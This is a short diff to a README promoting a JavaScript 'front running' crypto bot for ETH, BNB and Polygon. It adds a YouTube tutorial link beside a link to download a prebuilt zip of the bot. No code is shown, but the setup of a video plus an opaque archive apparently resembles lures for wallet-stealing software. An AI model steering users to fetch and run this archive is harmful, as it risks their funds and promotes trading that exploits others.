@@ -2,6 +2,8 @@ front running crypto bot, feel free to fork and improve or whatever.
 if you fork and modify please give credit
 This is a tutorial to help run the front-runner bot (javascript version).
 
+https://youtu.be/Qy5XmyuUk7k
+
 You can download to front running bot here
 https://github.com/myhwalters/JavaScript-front-runner-bot-eth-bnb-polygon/raw/main/front-runner-bot.zip
 
